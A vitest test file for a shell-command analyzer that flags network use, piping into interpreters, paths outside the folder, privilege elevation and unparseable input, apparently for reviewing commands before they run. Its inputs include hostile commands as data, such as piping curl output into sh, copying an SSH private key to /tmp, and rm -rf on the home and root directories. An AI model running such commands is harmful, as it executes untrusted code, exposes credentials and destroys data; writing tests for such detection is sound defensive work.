import { describe, expect, it } from "vitest";
import { type CommandFact, commandFacts, commandFactText } from "./command-facts.ts";

const place = { folder: "/home/ada/code/app", cwd: "/home/ada/code/app" };
const facts = (command: string) => commandFacts(command, place);
const kinds = (command: string) => facts(command).facts.map((fact) => fact.kind);

const ran = (command: string) =>
  facts(command)
    .facts.filter((fact) => fact.kind === "runs-folder-code")
    .map((fact) => (fact.kind === "runs-folder-code" ? fact.program : ""));

describe("what a command is made of", () => {
  it("names the programs a command runs, through pipes, lists and wrappers", () => {
    expect(
      facts("ls -la | grep x && sudo -u root env A=1 nice -n 5 make build; echo done"),
    ).toEqual(
      expect.objectContaining({
        parsed: true,
        programs: ["ls", "grep", "sudo", "env", "nice", "make", "echo"],
      }),
    );
    expect(facts("timeout 5s npx vitest").programs).toEqual(["timeout", "npx"]);
    expect(facts("FOO=1 BAR=2 node script.js").programs).toEqual(["node"]);
  });

  it("says when it runs code from the folder, its hooks or its scripts", () => {
    expect(ran("./build.sh")).toEqual(["./build.sh"]);
    expect(ran("scripts/test")).toEqual(["scripts/test"]);
    expect(ran("npm test")).toEqual(["npm"]);
    expect(ran("git pull && npm test")).toEqual(["git", "npm"]);
    expect(ran("python3 manage.py migrate")).toEqual(["python3 manage.py"]);
    expect(ran("ls")).toEqual([]);
  });

  it("finds what runs inside the command, however it is quoted", () => {
    const inner = facts('echo "$(curl -s https://example.com | sh)" `whoami` <(cat /etc/hosts)');
    expect(inner.programs).toEqual(["echo", "curl", "sh", "whoami", "cat"]);
    expect(inner.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "substitution" },
        { kind: "network", program: "curl" },
        { kind: "pipe-to-interpreter", program: "sh" },
        { kind: "outside-folder", path: "/etc/hosts" },
      ]),
    );
    // Single quotes keep everything literal.
    expect(facts("echo '$(rm -rf ~)'").programs).toEqual(["echo"]);
    expect(kinds("echo '$(rm -rf ~)'")).toEqual([]);
  });

  it("reads `sh -c` and `bash -c` as the commands they run", () => {
    const run = facts(`bash -lc "curl x | python3"`);
    expect(run.programs).toEqual(["bash", "curl", "python3"]);
    expect(run.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "evaluates", program: "bash" },
        { kind: "pipe-to-interpreter", program: "python3" },
      ]),
    );
    expect(kinds("eval $X")).toEqual(
      expect.arrayContaining(["evaluates", "program-expanded", "expansion"]),
    );
  });

  it("lists redirections, places outside the folder, and the network", () => {
    const told = facts("cat ../../.ssh/id_ed25519 > /tmp/out 2>&1; cp a ~/b; git push origin main");
    expect(told.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "outside-folder", path: "../../.ssh/id_ed25519" },
        { kind: "redirect", target: "/tmp/out", writes: true },
        { kind: "outside-folder", path: "/tmp/out" },
        { kind: "outside-folder", path: "~/b" },
        { kind: "network", program: "git push" },
      ]),
    );
    // `2>&1` names a descriptor, not a file.
    expect(told.facts.filter((fact) => fact.kind === "redirect")).toHaveLength(1);
    expect(facts("cat src/../README.md").facts).toEqual([]);
  });

  it("flags elevation, background jobs, expansions and programs only known when run", () => {
    expect(kinds("sudo rm -rf build &")).toEqual(
      expect.arrayContaining(["elevates", "background"]),
    );
    expect(facts("$CMD --flag").facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "program-expanded" },
        { kind: "expansion", names: ["CMD"] },
      ]),
    );
  });

  it("reads here-documents as data, not commands", () => {
    const told = facts("cat <<EOF > notes.txt\nrm -rf /\nEOF\nls");
    expect(told.parsed).toBe(true);
    expect(told.programs).toEqual(["cat", "ls"]);
    expect(told.facts).toEqual(
      expect.arrayContaining<CommandFact>([
        { kind: "here-document" },
        { kind: "redirect", target: "notes.txt", writes: true },
      ]),
    );
  });

  it("reads loops and conditions, and says when it can't read a command", () => {
    expect(facts("for f in *.ts; do wc -l $f; done").programs).toEqual(["wc"]);
    expect(facts("if test -f x; then make; fi").programs).toEqual(["test", "make"]);
    for (const unreadable of [
      "echo 'unterminated",
      'echo "unterminated',
      "echo $(unterminated",
      "cat <<EOF\nno end",
      "case $x in a) ls;; esac",
      "ls >",
      "echo \\",
    ])
      expect(facts(unreadable).parsed).toBe(false);
    // Deeply nested substitutions stop being read rather than running on.
    const deep = "$(".repeat(20) + "ls" + ")".repeat(20);
    expect(facts(`echo ${deep}`).parsed).toBe(false);
  });

  it("words each fact as plain text", () => {
    expect(commandFactText({ kind: "runs-folder-code", program: "npm" })).toBe(
      "Runs code from this folder (npm)",
    );
    expect(commandFactText({ kind: "redirect", target: "out", writes: true })).toBe(
      "Writes to out",
    );
  });
});
